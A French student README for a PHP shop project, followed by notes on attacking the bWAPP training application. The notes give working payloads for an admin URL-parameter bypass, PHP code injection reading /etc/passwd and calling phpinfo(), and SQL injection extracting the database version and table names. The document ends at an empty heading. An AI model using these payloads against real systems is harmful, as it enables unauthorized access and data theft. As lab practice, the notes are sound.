# validationPhp
index.php :

Correspond a la page du login . Pour se connecter a la boutique privée

accueil.php :

On recupère uns session avec session_start()

Dans le dossier includes :

Les fichiers qui permettent de gérer le login et logout

Dans les pages se trouve :

- La page ou se trouve la liste des produits : produit.php.

- La page fonctionsPanier permet de gérer tout ce qui est ajout , suppression , modification du panier, verrou du panier pour le total, 

- La form permet de creer un element mais ne fonctionne pas,
par manque de temps sa bloque je pense au niveau du fichier model qui n'arrive pas a trouver. je voulais réintégrer l'ancien Tp qui avait fonctionner et le modifier.

- le layout correspond au model 

## Test sécurité Bwapp :

Action effectuer pour exploiter les failles de BWAPP :

# - A2 Broken auth & Session management / Administrative  Portals :
    Dans l'url passer l'admin a 1 'admin=1' pour pouvoir acceder au contenu 

# - A1 Injection / PHP Code Injection :

En utilisant la fonction readfile en php on peut récuperer les identifiants du site en question ex :

message=readfile("../../../../../../../../../etc/passwd");

Et même avoir des informations sur l'installation et language utilisé avec la méthode phpinfo() ex:
message=phpinfo();

# - A1 Injection / SQL stored (blog) :

Il suffit d'effectuer des requête sql pour récuperer des infos de la bbd ou de la configuration en question ex : truc',(SELECT version()))--
voici le resultat :
5.5.47-0ubuntu0.14.04.1

ou encore des nom de table :

truc',(select group_concat(table_name) FROM information_Schema.tables where table_schema = "bwapp"))--

ce qui nous donne:  blog , heroes, movies, users, visitors

# - A1 Injection / SQL Injection (POST/Select) :

